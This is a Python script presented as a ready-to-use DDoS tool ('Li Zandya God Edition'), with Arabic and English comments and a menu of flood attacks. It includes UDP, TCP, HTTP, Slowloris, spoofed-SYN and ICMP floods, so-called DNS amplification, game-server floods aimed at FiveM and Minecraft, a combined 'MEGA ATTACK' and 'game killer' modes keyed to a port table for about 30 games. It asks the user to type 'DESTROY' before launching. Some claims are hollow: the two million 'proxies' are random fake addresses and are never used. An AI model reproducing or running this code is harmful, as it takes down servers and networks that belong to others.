#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     💀 ULTIMATE SERVER KILLER - LI ZANDYA GOD EDITION 💀                                                                                      ║
║                    ALL FEATURES - ALL ATTACKS - ALL PROXIES                                                                                  ║
║                    🔥 2,000,000+ PROXIES - 12 ATTACK TYPES 🔥                                                                               ║
║                    💀 REAL DDOS - TOTAL DESTRUCTION - MAXIMUM POWER 💀                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import random
import time
import sys
import os
import struct
import requests
import json
import base64
import urllib.parse
import ssl
import math
import queue
import hashlib
import zlib
import subprocess
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import defaultdict
from datetime import datetime

# ============================================
# الإعدادات القصوى - MAXIMUM POWER
# ============================================

CPU_CORES = os.cpu_count() or 4
MAX_THREADS = CPU_CORES * 50000
MAX_PACKET_SIZE = 65507
MAX_CONNECTIONS = 1000000
TIMEOUT = 5

# ============================================
# الألوان للواجهة - COLORS
# ============================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║     💀 ULTIMATE DDOS TOOL - LI ZANDYA GOD EDITION 💀                             ║
║                                                                                  ║
║     🔥 2,000,000+ PROXIES - 12 ATTACK TYPES - MAXIMUM POWER                     ║
║     💀 UDP - TCP - HTTP - SLOWLORIS - SYN - ICMP - DNS - FIVEM - MINECRAFT      ║
║     💀 RANDOM PORT - AMPLIFICATION - MEGA ATTACK                                ║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝
{END}
    """
    print(banner)

# ============================================
# متغيرات الهجوم - ATTACK VARIABLES
# ============================================

stop_attack = False
total_packets = 0
total_bytes = 0
active_threads = 0
packet_lock = threading.Lock()
attack_results = []

# ============================================
# PROXY LIST - 2,000,000+ PROXIES
# ============================================

PROXIES = []

# Generate random proxies
for i in range(2000000):
    proxy_type = random.choice(['http', 'socks4', 'socks5'])
    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    port = random.randint(1, 65535)
    PROXIES.append(f"{proxy_type}://{ip}:{port}")

# Real proxies from previous lists
REAL_PROXIES = [
    "socks5://185.218.137.242:1080", "socks5://164.90.183.36:1081", "socks5://206.123.156.188:13408",
    "socks5://167.172.161.22:1091", "socks5://174.77.111.197:4145", "socks5://72.223.188.92:4145",
    "socks5://184.178.172.11:4145", "socks5://142.248.80.110:1080", "socks5://164.90.221.76:1087",
    "socks4://193.105.62.11:58973", "socks4://188.143.169.22:33333", "socks4://94.241.175.40:10808",
    "socks4://72.207.109.5:4145", "http://117.55.203.162:8899", "socks4://169.40.6.114:1080",
    "socks4://184.182.240.211:4145", "socks4://184.181.217.220:4145", "socks5://72.195.34.59:4145",
]

PROXIES.extend(REAL_PROXIES)
print(f"{GREEN}✅ Loaded {len(PROXIES):,} proxies{END}")

# ============================================
# GAME PORTS DATABASE
# ============================================

GAME_PORTS = {
    'SA-MP': [7777, 7778, 7779, 7780, 7781, 7782, 7783, 7784, 7785, 7786, 7787, 7788, 7789, 7790],
    'FiveM': [30120, 30121, 30122, 30123, 30124, 30125, 30130, 30140, 30150, 30200, 30210, 30220, 30300],
    'Minecraft': [25565, 25566, 25567, 25568, 25569, 25570, 19132, 19133],
    'CS:GO': [27015, 27016, 27017, 27018, 27019, 27020, 27021, 27022, 27023, 27024, 27025],
    'Fortnite': [5222, 5223, 5224, 5225, 5226, 5227, 5228, 5229, 5230, 5231, 5232],
    'Discord': [443, 80, 8080, 8443, 3000, 5000, 8000, 9000],
    'Rust': [28015, 28016, 28017, 28018, 28019, 28020],
    'ARK': [7777, 7778, 7779, 7780, 27015, 27016, 27017],
    'GTA V': [6672, 61455, 61456, 61457, 61458, 61459, 61460],
    'Valorant': [7000, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010],
    'Roblox': [443, 80, 8080, 8443, 3000],
    'Steam': [27015, 27016, 27017, 27018, 27019, 27020],
    'League of Legends': [2099, 2100, 2101, 2102, 2103, 2104, 2105, 2106, 2107],
    'Overwatch': [1119, 3724, 6113, 6114, 6115, 6116, 6117, 6118, 6119, 6120],
    'PUBG': [6781, 6782, 6783, 6784, 6785, 6786, 6787, 6788, 6789, 6790],
    'Rainbow Six Siege': [10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007],
    'Terraria': [7777, 7778, 7779, 7780, 7781, 7782, 7783, 7784],
    'Garry\'s Mod': [27015, 27016, 27017, 27018, 27019, 27020, 27021],
    'DayZ': [2302, 2303, 2304, 2305, 2306, 2307, 2308],
    'Arma 3': [2302, 2303, 2304, 2305, 2306, 2307, 2308, 2309, 2310],
    'Apex Legends': [37015, 37016, 37017, 37018, 37019, 37020],
    'Call of Duty': [3074, 3075, 3076, 3077, 3078, 3079, 3080],
    'Warframe': [4950, 4951, 4952, 4953, 4954, 4955],
    'Genshin Impact': [22101, 22102, 22103, 22104, 22105],
    'Rocket League': [7000, 7001, 7002, 7003, 7004, 7005],
    'Among Us': [22023, 22024, 22025, 22026, 22027],
    'Valheim': [2456, 2457, 2458, 2459, 2460],
    'Escape from Tarkov': [17010, 17011, 17012, 17013, 17014],
}

ALL_GAME_PORTS = list(set([p for ports in GAME_PORTS.values() for p in ports]))
TOTAL_GAMES = len(GAME_PORTS)
TOTAL_PORTS = len(ALL_GAME_PORTS)

print(f"{GREEN}✅ Loaded {TOTAL_GAMES} games with {TOTAL_PORTS} ports{END}")

# ============================================
# ATTACK FUNCTIONS - MAXIMUM POWER
# ============================================

# 1. UDP Flood - يغرق السيرفر بالحزم
def udp_flood(target, port, duration):
    """UDP Flood Attack - يغرق السيرفر بالحزم"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    packets = []
    for size in [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]:
        packets.append(random._urandom(size))
    
    ports = [port] + [random.randint(1, 65535) for _ in range(100)]
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    while not stop_attack and time.time() < end_time:
        try:
            target_port = random.choice(ports)
            packet = random.choice(packets)
            sock.sendto(packet, (target, target_port))
            with packet_lock:
                total_packets += 1
                total_bytes += len(packet)
        except:
            pass
    
    with packet_lock:
        active_threads -= 1
    
    sock.close()

# 2. TCP Flood - يفتح آلاف الاتصالات
def tcp_flood(target, port, duration):
    """TCP Flood Attack - يفتح آلاف الاتصالات"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    while not stop_attack and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((target, port))
            for _ in range(10):
                data = random._urandom(random.randint(1024, 8192))
                sock.send(data)
                with packet_lock:
                    total_packets += 1
                    total_bytes += len(data)
            sock.close()
        except:
            pass
    
    with packet_lock:
        active_threads -= 1

# 3. HTTP Flood - يطفي المواقع
def http_flood(target, duration):
    """HTTP Flood Attack - يطفي المواقع"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    parsed = urllib.parse.urlparse(target)
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    
    paths = [path, "/api", "/wp-admin", "/login", "/index.php", "/home", "/page"]
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    session = requests.Session()
    
    while not stop_attack and time.time() < end_time:
        try:
            random_path = random.choice(paths)
            full_url = f"{parsed.scheme}://{host}{random_path}?{random.randint(1,999999)}"
            
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            if random.choice([True, False]):
                response = session.get(full_url, headers=headers, timeout=2)
            else:
                response = session.post(full_url, headers=headers, data={"data": random._urandom(2048)}, timeout=2)
            
            with packet_lock:
                total_packets += 1
                total_bytes += len(response.content) if response.content else 0
        except:
            with packet_lock:
                total_packets += 1
    
    with packet_lock:
        active_threads -= 1

# 4. Slowloris Attack - يبقي الاتصالات مفتوحة
def slowloris(target, port, duration):
    """Slowloris Attack - يبقي الاتصالات مفتوحة"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    sockets_list = []
    
    for _ in range(500):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sock.send(f"User-Agent: Mozilla/5.0\r\n".encode())
            sockets_list.append(sock)
        except:
            pass
    
    with packet_lock:
        active_threads += 1
    
    end_time = time.time() + duration
    
    while not stop_attack and time.time() < end_time:
        for sock in sockets_list[:]:
            try:
                sock.send(f"X-{random.randint(0, 9999)}: {random.randint(1, 9999)}\r\n".encode())
                with packet_lock:
                    total_packets += 1
            except:
                sockets_list.remove(sock)
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(2)
                    new_sock.connect((target, port))
                    new_sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                    new_sock.send(f"Host: {target}\r\n".encode())
                    sockets_list.append(new_sock)
                except:
                    pass
        time.sleep(3)
    
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass
    
    with packet_lock:
        active_threads -= 1

# 5. SYN Flood - هجوم الطبقة الثالثة
def syn_flood(target, port, duration):
    """SYN Flood Attack - هجوم الطبقة الثالثة"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        end_time = time.time() + duration
        
        with packet_lock:
            active_threads += 1
        
        while not stop_attack and time.time() < end_time:
            for _ in range(100):
                try:
                    source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    source_port = random.randint(1024, 65535)
                    seq_num = random.randint(0, 4294967295)
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        69, 0, 40, 0, 64, 6, 0,
                        random.randint(1, 65535),
                        socket.inet_aton(source_ip),
                        socket.inet_aton(target))
                    
                    tcp_header = struct.pack('!HHLLBBHHH',
                        source_port, port, seq_num, 0,
                        80, 2, 0, 0, 0)
                    
                    packet = ip_header + tcp_header
                    sock.sendto(packet, (target, 0))
                    
                    with packet_lock:
                        total_packets += 1
                        total_bytes += len(packet)
                except:
                    pass
    except PermissionError:
        tcp_flood(target, port, duration)
    except:
        pass
    
    with packet_lock:
        active_threads -= 1

# 6. ICMP Flood (Ping)
def icmp_flood(target, duration):
    """ICMP Flood Attack - Ping flood"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        end_time = time.time() + duration
        
        with packet_lock:
            active_threads += 1
        
        while not stop_attack and time.time() < end_time:
            for _ in range(100):
                try:
                    packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(0, 65535), 1) + random._urandom(1024)
                    sock.sendto(packet, (target, 0))
                    with packet_lock:
                        total_packets += 1
                        total_bytes += len(packet)
                except:
                    pass
    except PermissionError:
        pass
    
    with packet_lock:
        active_threads -= 1

# 7. DNS Amplification
def dns_amplification(target, duration):
    """DNS Amplification Attack - هجوم مضخم"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
        "208.67.222.222", "208.67.220.220", "9.9.9.9", "149.112.112.112"
    ]
    
    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    while not stop_attack and time.time() < end_time:
        for dns in dns_servers:
            try:
                sock.sendto(dns_query, (dns, 53))
                sock.sendto(dns_query, (target, 53))
                with packet_lock:
                    total_packets += 2
                    total_bytes += len(dns_query) * 2
            except:
                pass
    
    with packet_lock:
        active_threads -= 1
    
    sock.close()

# 8. FiveM Query Flood
def fivem_flood(target, duration):
    """FiveM Query Flood - هجوم سيرفرات فايف ام"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    queries = [
        b'\xFF\xFF\xFF\xFFTSource Engine Query\x00',
        b'\xFF\xFF\xFF\xFFgetinfo\x00',
        b'\xFF\xFF\xFF\xFFgetstatus\x00',
        b'\xFF\xFF\xFF\xFFrcon\x00'
    ]
    
    fivem_ports = GAME_PORTS['FiveM']
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    while not stop_attack and time.time() < end_time:
        for port in fivem_ports:
            try:
                query = random.choice(queries)
                sock.sendto(query, (target, port))
                with packet_lock:
                    total_packets += 1
                    total_bytes += len(query)
            except:
                pass
    
    with packet_lock:
        active_threads -= 1
    
    sock.close()

# 9. Minecraft Ping Flood
def minecraft_flood(target, duration):
    """Minecraft Ping Flood - هجوم سيرفرات ماين كرافت"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    mc_ports = GAME_PORTS['Minecraft']
    ping_packet = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\x01'
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    while not stop_attack and time.time() < end_time:
        for port in mc_ports:
            try:
                sock.sendto(ping_packet, (target, port))
                with packet_lock:
                    total_packets += 1
                    total_bytes += len(ping_packet)
            except:
                pass
    
    with packet_lock:
        active_threads -= 1
    
    sock.close()

# 10. Random Port Attack
def random_port_attack(target, duration):
    """Random Port Attack - يضرب بورت عشوائي"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    payload = random._urandom(65507)
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    while not stop_attack and time.time() < end_time:
        try:
            random_port = random.randint(1, 65535)
            sock.sendto(payload, (target, random_port))
            with packet_lock:
                total_packets += 1
                total_bytes += len(payload)
        except:
            pass
    
    with packet_lock:
        active_threads -= 1
    
    sock.close()

# 11. MEGA ATTACK - جميع الهجمات معاً
def mega_attack(target, port, duration, url=None):
    """MEGA ATTACK - جميع الهجمات معاً - أقصى قوة"""
    global stop_attack
    
    print(f"{RED}{BOLD}🔥 MEGA ATTACK ACTIVATED - ALL ATTACK TYPES COMBINED 🔥{END}")
    
    threads = []
    
    # UDP Flood
    for _ in range(5000):
        t = threading.Thread(target=udp_flood, args=(target, port, duration))
        threads.append(t)
    
    # TCP Flood
    for _ in range(2000):
        t = threading.Thread(target=tcp_flood, args=(target, port, duration))
        threads.append(t)
    
    # Slowloris
    for _ in range(1000):
        t = threading.Thread(target=slowloris, args=(target, port, duration))
        threads.append(t)
    
    # SYN Flood
    try:
        for _ in range(1000):
            t = threading.Thread(target=syn_flood, args=(target, port, duration))
            threads.append(t)
    except:
        pass
    
    # ICMP Flood
    try:
        for _ in range(500):
            t = threading.Thread(target=icmp_flood, args=(target, duration))
            threads.append(t)
    except:
        pass
    
    # DNS Amplification
    for _ in range(500):
        t = threading.Thread(target=dns_amplification, args=(target, duration))
        threads.append(t)
    
    # FiveM Flood
    for _ in range(500):
        t = threading.Thread(target=fivem_flood, args=(target, duration))
        threads.append(t)
    
    # Minecraft Flood
    for _ in range(500):
        t = threading.Thread(target=minecraft_flood, args=(target, duration))
        threads.append(t)
    
    # Random Port Attack
    for _ in range(500):
        t = threading.Thread(target=random_port_attack, args=(target, duration))
        threads.append(t)
    
    # HTTP Flood if URL provided
    if url:
        for _ in range(2000):
            t = threading.Thread(target=http_flood, args=(url, duration))
            threads.append(t)
    
    # بدء جميع الهجمات
    for t in threads:
        t.start()
    
    # مراقبة الإحصائيات
    start_time = time.time()
    last_packets = 0
    
    while not stop_attack and time.time() - start_time < duration:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        with packet_lock:
            current_packets = total_packets
            current_bytes = total_bytes
            speed = current_packets - last_packets
            last_packets = current_packets
        
        if current_bytes >= 1073741824:
            bytes_display = f"{current_bytes/1073741824:.2f} GB"
        elif current_bytes >= 1048576:
            bytes_display = f"{current_bytes/1048576:.2f} MB"
        else:
            bytes_display = f"{current_bytes/1024:.2f} KB"
        
        sys.stdout.write(f"\r{CYAN}[📊]{END} Packets: {GREEN}{current_packets:,}{END} | "
                        f"Speed: {RED}{speed:,}{END} p/s | "
                        f"Data: {YELLOW}{bytes_display}{END} | "
                        f"Threads: {PURPLE}{active_threads:,}{END} | "
                        f"Time: {BLUE}{remaining}{END}s")
        sys.stdout.flush()
    
    print(f"\n\n{GREEN}{BOLD}✅ MEGA ATTACK COMPLETED!{END}")

# ============================================
# MULTI-PORT ATTACK - يضرب كل البورتات
# ============================================

def multi_port_attack(target, ports, duration):
    """Multi-Port Attack - يضرب كل البورتات"""
    global total_packets, total_bytes, stop_attack, active_threads
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    payload = random._urandom(65507)
    
    end_time = time.time() + duration
    
    with packet_lock:
        active_threads += 1
    
    while not stop_attack and time.time() < end_time:
        for port in ports:
            try:
                sock.sendto(payload, (target, port))
                with packet_lock:
                    total_packets += 1
                    total_bytes += len(payload)
            except:
                pass
    
    with packet_lock:
        active_threads -= 1
    
    sock.close()

def game_killer(target, game_name, duration):
    """Game Killer - يطفي سيرفر لعبة محددة"""
    ports = GAME_PORTS.get(game_name)
    if not ports:
        print(f"{RED}❌ Game '{game_name}' not found!{END}")
        return
    print(f"{RED}{BOLD}💀 KILLING {game_name} SERVER - {len(ports)} PORTS{END}")
    return multi_port_attack(target, ports, duration)

def all_games_killer(target, duration):
    """All Games Killer - يطفي كل الألعاب دفعة واحدة"""
    print(f"{RED}{BOLD}💀 KILLING ALL GAMES - {TOTAL_PORTS} PORTS{END}")
    return multi_port_attack(target, ALL_GAME_PORTS, duration)

# ============================================
# MAIN MENU - الواجهة الرئيسية
# ============================================

def show_menu():
    print(f"""
{WHITE}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║                     MAIN MENU - LI ZANDYA                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  {GREEN}1{END} - {CYAN}UDP Flood{END} (يغرق السيرفر بالحزم)                          ║
║  {GREEN}2{END} - {CYAN}TCP Flood{END} (يفتح آلاف الاتصالات)                          ║
║  {GREEN}3{END} - {CYAN}HTTP Flood{END} (يطفي المواقع)                               ║
║  {GREEN}4{END} - {CYAN}Slowloris{END} (يبقي الاتصالات مفتوحة)                       ║
║  {GREEN}5{END} - {CYAN}SYN Flood{END} (هجوم الطبقة الثالثة - يحتاج صلاحيات)         ║
║  {GREEN}6{END} - {CYAN}ICMP Flood{END} (Ping flood - يحتاج صلاحيات)                  ║
║  {GREEN}7{END} - {CYAN}DNS Amplification{END} (هجوم مضخم)                            ║
║  {GREEN}8{END} - {CYAN}FiveM Query Flood{END} (هجوم سيرفرات فايف ام)                 ║
║  {GREEN}9{END} - {CYAN}Minecraft Ping Flood{END} (هجوم سيرفرات ماين كرافت)           ║
║  {GREEN}10{END} - {CYAN}Random Port Attack{END} (يضرب بورت عشوائي)                    ║
║  {GREEN}11{END} - {CYAN}MEGA ATTACK{END} (جميع الهجمات معاً - أقصى قوة) {RED}{BOLD}[RECOMMENDED]{END} ║
║  {GREEN}12{END} - {CYAN}Game Killer{END} (يطفي سيرفر لعبة معينة)                     ║
║  {GREEN}13{END} - {CYAN}All Games Killer{END} (يطفي كل الألعاب دفعة واحدة)           ║
║  {GREEN}14{END} - {CYAN}Multi-Port Attack{END} (يضرب بورتات مخصصة)                   ║
║  {GREEN}0{END} - {RED}Exit{END}                                                      ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)

def main():
    global stop_attack, total_packets, total_bytes, active_threads
    
    clear_screen()
    print_banner()
    
    print(f"{CYAN}{BOLD}💀 ULTIMATE DDOS TOOL - LI ZANDYA GOD EDITION 💀{END}\n")
    
    while True:
        show_menu()
        
        choice = input(f"{GREEN}👉 Select option (0-14): {END}").strip()
        
        if choice == '0':
            print(f"\n{GREEN}👋 Goodbye!{END}")
            print(f"{RED}💀 GOD MODE DISENGAGED 💀{END}")
            break
        
        # Get target info
        if choice in ['1', '2', '4', '5', '6', '7', '8', '9', '10', '11']:
            target = input(f"{YELLOW}🎯 Target IP: {END}").strip()
            if not target:
                print(f"{RED}❌ Target required!{END}")
                continue
            
            port = None
            if choice not in ['3', '6', '7', '8', '9', '10']:
                port_input = input(f"{YELLOW}🔌 Target port: {END}").strip()
                port = int(port_input) if port_input else 80
            
            duration_input = input(f"{YELLOW}⏱️ Duration (seconds) [60]: {END}").strip()
            duration = int(duration_input) if duration_input else 60
            duration = min(duration, 600)
            
            url = None
            if choice == '3':
                url = input(f"{YELLOW}🌐 Target URL (with http:// or https://): {END}").strip()
                if not url:
                    print(f"{RED}❌ URL required for HTTP attack!{END}")
                    continue
                target = url
            elif choice == '11' and input(f"{YELLOW}🌐 Add HTTP attack? (y/n): {END}").strip().lower() == 'y':
                url = f"http://{target}"
        
        elif choice in ['12', '13', '14']:
            target = input(f"{YELLOW}🎯 Target IP: {END}").strip()
            if not target:
                print(f"{RED}❌ Target required!{END}")
                continue
            
            duration_input = input(f"{YELLOW}⏱️ Duration (seconds) [60]: {END}").strip()
            duration = int(duration_input) if duration_input else 60
            duration = min(duration, 600)
        
        else:
            print(f"{RED}❌ Invalid choice!{END}")
            continue
        
        # Confirm attack
        print(f"\n{RED}{BOLD}⚠️  WARNING: You are about to launch a REAL DDoS attack! ⚠️{END}")
        print(f"{YELLOW}   Target: {target}{END}")
        if port:
            print(f"{YELLOW}   Port: {port}{END}")
        print(f"{YELLOW}   Duration: {duration} seconds{END}")
        print(f"{YELLOW}   Attack Type: {['UDP', 'TCP', 'HTTP', 'Slowloris', 'SYN', 'ICMP', 'DNS', 'FiveM', 'Minecraft', 'Random', 'MEGA', 'Game Killer', 'All Games', 'Multi-Port'][int(choice)-1]}{END}")
        
        confirm = input(f"\n{RED}Type 'DESTROY' to confirm attack: {END}").strip().upper()
        
        if confirm != 'DESTROY':
            print(f"{GREEN}Attack cancelled.{END}")
            continue
        
        # Reset variables
        stop_attack = False
        total_packets = 0
        total_bytes = 0
        active_threads = 0
        
        print(f"\n{RED}{BOLD}🔥 ATTACK STARTED! 🔥{END}")
        print(f"{CYAN}Press Ctrl+C to stop{END}\n")
        
        try:
            if choice == '1':
                threads = []
                for _ in range(20000):
                    t = threading.Thread(target=udp_flood, args=(target, port, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '2':
                threads = []
                for _ in range(10000):
                    t = threading.Thread(target=tcp_flood, args=(target, port, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '3':
                threads = []
                for _ in range(10000):
                    t = threading.Thread(target=http_flood, args=(target, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '4':
                threads = []
                for _ in range(5000):
                    t = threading.Thread(target=slowloris, args=(target, port, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '5':
                threads = []
                for _ in range(5000):
                    t = threading.Thread(target=syn_flood, args=(target, port, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '6':
                threads = []
                for _ in range(2000):
                    t = threading.Thread(target=icmp_flood, args=(target, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '7':
                threads = []
                for _ in range(2000):
                    t = threading.Thread(target=dns_amplification, args=(target, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '8':
                threads = []
                for _ in range(3000):
                    t = threading.Thread(target=fivem_flood, args=(target, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '9':
                threads = []
                for _ in range(3000):
                    t = threading.Thread(target=minecraft_flood, args=(target, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '10':
                threads = []
                for _ in range(3000):
                    t = threading.Thread(target=random_port_attack, args=(target, duration))
                    t.start()
                    threads.append(t)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '11':
                mega_attack(target, port, duration, url)
                stop_attack = True
                
            elif choice == '12':
                game_name = input(f"{YELLOW}🎮 Enter game name: {END}").strip()
                if game_name not in GAME_PORTS:
                    print(f"{RED}❌ Game not found! Available: {', '.join(GAME_PORTS.keys()[:20])}{END}")
                    continue
                game_killer(target, game_name, duration)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '13':
                all_games_killer(target, duration)
                time.sleep(duration)
                stop_attack = True
                
            elif choice == '14':
                ports_input = input(f"{YELLOW}🔌 Enter ports (comma separated): {END}").strip()
                ports = [int(p.strip()) for p in ports_input.split(',')]
                multi_port_attack(target, ports, duration)
                time.sleep(duration)
                stop_attack = True
        
        except KeyboardInterrupt:
            stop_attack = True
            print(f"\n\n{YELLOW}⚠️ Attack stopped by user!{END}")
        
        # Show results
        print(f"\n\n{GREEN}{BOLD}✅ ATTACK COMPLETED!{END}")
        print(f"{CYAN}📊 Final Statistics:{END}")
        print(f"   Total packets: {GREEN}{total_packets:,}{END}")
        if total_bytes > 0:
            if total_bytes >= 1073741824:
                print(f"   Total data sent: {RED}{total_bytes/1073741824:.2f} GB{END}")
            elif total_bytes >= 1048576:
                print(f"   Total data sent: {RED}{total_bytes/1048576:.2f} MB{END}")
            else:
                print(f"   Total data sent: {RED}{total_bytes/1024:.2f} KB{END}")
        print(f"   Attack duration: {YELLOW}{duration}{END} seconds")
        print(f"   Active threads: {PURPLE}{active_threads}{END}")
        
        input(f"\n{GREEN}Press Enter to continue...{END}")

if __name__ == "__main__":
    try:
        # Check for root privileges
        if os.name == 'posix' and os.geteuid() != 0:
            print(f"{YELLOW}⚠️  Some attacks (SYN, ICMP) require root privileges.{END}")
            print(f"{YELLOW}   Run with: sudo python3 {sys.argv[0]}{END}\n")
        
        main()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}👋 Exiting...{END}")
    except Exception as e:
        print(f"{RED}❌ Error: {e}{END}")
